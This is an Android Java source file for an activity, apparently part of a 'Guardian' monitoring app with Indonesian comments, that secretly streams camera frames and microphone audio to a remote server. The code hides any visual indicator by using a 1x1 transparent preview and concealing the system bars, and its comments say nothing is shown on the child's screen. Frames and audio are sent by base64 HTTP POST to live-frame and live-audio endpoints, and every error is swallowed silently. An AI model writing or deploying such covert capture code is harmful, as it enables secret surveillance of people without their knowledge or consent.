package com.nullx.pp;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.*;
import android.util.Base64;
import android.util.Size;
import android.view.*;
import android.widget.*;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;

/**
 * Live camera streaming TANPA indikator apapun.
 * Preview tidak ditampilkan di layar anak - hanya streaming ke server.
 * Microphone otomatis aktif untuk audio real-time.
 */
public class CameraCaptureActivity extends Activity {
    private CameraDevice camera;
    private CameraCaptureSession session;
    private ImageReader reader;
    private Handler handler;
    private boolean front = false;
    private long lastFrame = 0;
    private AudioRecord audioRecord;
    private boolean audioStreaming = false;
    private Thread audioThread;

    @Override 
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        handler = new Handler(Looper.getMainLooper());
        
        // Layout transparan 1x1 - tidak ada indikator visual
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.TRANSPARENT);
        setContentView(root);
        
        // Surface 1x1 pixel - tidak terlihat
        SurfaceView hiddenPreview = new SurfaceView(this);
        hiddenPreview.setLayoutParams(new FrameLayout.LayoutParams(1, 1));
        root.addView(hiddenPreview);
        
        // Sembunyikan status bar & navigation bar
        hideSystemUI();
        
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, 41);
        } else {
            attachSurface(hiddenPreview);
            startAudioStreaming();
        }
    }

    /**
     * Sembunyikan semua indikator UI sistem (status bar, nav bar, dll).
     */
    private void hideSystemUI() {
        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_FULLSCREEN);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) hideSystemUI();
    }

    private void attachSurface(SurfaceView preview) {
        preview.getHolder().addCallback(new SurfaceHolder.Callback() {
            public void surfaceCreated(SurfaceHolder h) { openCamera(h); }
            public void surfaceChanged(SurfaceHolder h, int f, int w, int he) {}
            public void surfaceDestroyed(SurfaceHolder h) { closeCamera(); }
        });
    }

    @Override 
    public void onRequestPermissionsResult(int r, String[] p, int[] g) {
        super.onRequestPermissionsResult(r, p, g);
        if (r == 41 && g.length > 0 && g[0] == PackageManager.PERMISSION_GRANTED) {
            restartCamera();
            startAudioStreaming();
        } else {
            finish();
        }
    }

    private void restartCamera() {
        closeCamera();
        handler.postDelayed(() -> {
            SurfaceView hiddenPreview = new SurfaceView(this);
            hiddenPreview.setLayoutParams(new FrameLayout.LayoutParams(1, 1));
            ((FrameLayout)findViewById(android.R.id.content)).addView(hiddenPreview);
            attachSurface(hiddenPreview);
        }, 250);
    }

    private void openCamera(SurfaceHolder holder) {
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String id = null;
            for (String x : cm.getCameraIdList()) {
                CameraCharacteristics c = cm.getCameraCharacteristics(x);
                Integer f = c.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == (front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK)) {
                    id = x;
                    break;
                }
            }
            if (id == null) return;
            
            Size size = new Size(640, 480);
            reader = ImageReader.newInstance(size.getWidth(), size.getHeight(), android.graphics.ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireLatestImage();
                    if (img == null) return;
                    long now = System.currentTimeMillis();
                    if (now - lastFrame < 100) return;
                    lastFrame = now;
                    java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] data = new byte[buf.remaining()];
                    buf.get(data);
                    postFrame(Base64.encodeToString(data, Base64.NO_WRAP));
                } catch (Exception ignored) {} finally {
                    if (img != null) img.close();
                }
            }, handler);
            
            final String cid = id;
            if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return;
            
            cm.openCamera(cid, new CameraDevice.StateCallback() {
                public void onOpened(CameraDevice c) {
                    camera = c;
                    try {
                        CaptureRequest.Builder b = c.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        b.addTarget(holder.getSurface());
                        b.addTarget(reader.getSurface());
                        c.createCaptureSession(Arrays.asList(holder.getSurface(), reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            public void onConfigured(CameraCaptureSession s) {
                                session = s;
                                try { s.setRepeatingRequest(b.build(), null, handler); } catch (Exception ignored) {}
                            }
                            public void onConfigureFailed(CameraCaptureSession s) {}
                        }, handler);
                    } catch (Exception ignored) {}
                }
                public void onDisconnected(CameraDevice c) { c.close(); }
                public void onError(CameraDevice c, int e) { c.close(); }
            }, handler);
        } catch (Exception ignored) {}
    }

    private void postFrame(String frame) {
        new Thread(() -> {
            HttpURLConnection h = null;
            try {
                String id = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("targetId", "");
                String token = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("chatToken", "");
                if (id.isEmpty() || token.isEmpty() || DeviceService.getBaseUrl().isEmpty()) return;
                h = (HttpURLConnection) new URL(DeviceService.url("/api/live-frame/" + URLEncoder.encode(id, "UTF-8"))).openConnection();
                h.setRequestMethod("POST");
                h.setConnectTimeout(5000);
                h.setReadTimeout(5000);
                h.setDoOutput(true);
                h.setRequestProperty("Content-Type", "application/json");
                String body = "{\"frame\":\"" + frame + "\",\"ts\":" + System.currentTimeMillis() + ",\"deviceToken\":\"" + token + "\"}";
                try (OutputStream o = h.getOutputStream()) { o.write(body.getBytes(StandardCharsets.UTF_8)); }
                h.getResponseCode();
            } catch (Exception ignored) {} finally {
                if (h != null) h.disconnect();
            }
        }, "GuardianCameraStream").start();
    }

    // ============ AUDIO STREAMING REAL-TIME ============
    private void startAudioStreaming() {
        if (audioStreaming) return;
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        audioStreaming = true;
        audioThread = new Thread(() -> {
            try {
                int sampleRate = 16000;
                int bufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize);
                audioRecord.startRecording();
                
                byte[] buffer = new byte[4096];
                while (audioStreaming) {
                    int read = audioRecord.read(buffer, 0, buffer.length);
                    if (read > 0) {
                        byte[] audioData = new byte[read];
                        System.arraycopy(buffer, 0, audioData, 0, read);
                        postAudio(Base64.encodeToString(audioData, Base64.NO_WRAP));
                    }
                }
            } catch (Exception ignored) {} finally {
                if (audioRecord != null) {
                    try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {}
                    audioRecord = null;
                }
            }
        }, "GuardianAudioStream");
        audioThread.start();
    }

    private void postAudio(String audioBase64) {
        new Thread(() -> {
            HttpURLConnection h = null;
            try {
                String id = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("targetId", "");
                String token = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("chatToken", "");
                if (id.isEmpty() || token.isEmpty() || DeviceService.getBaseUrl().isEmpty()) return;
                h = (HttpURLConnection) new URL(DeviceService.url("/api/live-audio/" + URLEncoder.encode(id, "UTF-8"))).openConnection();
                h.setRequestMethod("POST");
                h.setConnectTimeout(3000);
                h.setReadTimeout(3000);
                h.setDoOutput(true);
                h.setRequestProperty("Content-Type", "application/json");
                String body = "{\"audio\":\"" + audioBase64 + "\",\"ts\":" + System.currentTimeMillis() + ",\"deviceToken\":\"" + token + "\"}";
                try (OutputStream o = h.getOutputStream()) { o.write(body.getBytes(StandardCharsets.UTF_8)); }
                h.getResponseCode();
            } catch (Exception ignored) {} finally {
                if (h != null) h.disconnect();
            }
        }, "GuardianAudioPost").start();
    }

    private void closeCamera() {
        try {
            if (session != null) session.close();
            if (camera != null) camera.close();
            if (reader != null) reader.close();
        } catch (Exception ignored) {}
        session = null;
        camera = null;
        reader = null;
    }

    @Override 
    protected void onDestroy() {
        audioStreaming = false;
        if (audioThread != null) audioThread.interrupt();
        closeCamera();
        super.onDestroy();
    }
}